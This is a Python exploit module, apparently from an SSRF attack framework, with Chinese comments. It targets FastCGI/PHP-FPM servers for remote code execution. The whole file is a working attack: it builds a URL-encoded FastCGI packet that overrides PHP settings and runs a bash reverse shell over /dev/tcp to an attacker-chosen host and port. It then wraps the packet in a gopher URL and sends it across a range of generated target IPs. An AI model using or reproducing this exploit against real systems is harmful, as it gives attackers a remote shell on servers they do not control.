import logging

from core.utils import *

name = "fastcgi"
description = "FastCGI 远程代码执行（RCE）"
author = "Unknown"
documentation = []


class exploit:
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        # 处理反弹 shell 参数
        if args.lhost == None:
            self.SERVER_HOST = input("服务器主机:")
        else:
            self.SERVER_HOST = args.lhost

        if args.lport == None:
            self.SERVER_PORT = input("服务器端口:")
        else:
            self.SERVER_PORT = args.lport

        # 使用生成器创建主机列表
        # 如需攻击其它目标，请修改下面的 IP
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            # 服务的数据和端口
            port = "9000"
            data = "%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/SERVER_HOST/SERVER_PORT%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00"
            payload = wrapper_gopher(data, ip, port)

            # 处理反弹 shell 参数
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)

            # 发送 payload
            r = requester.do_request(args.param, payload)
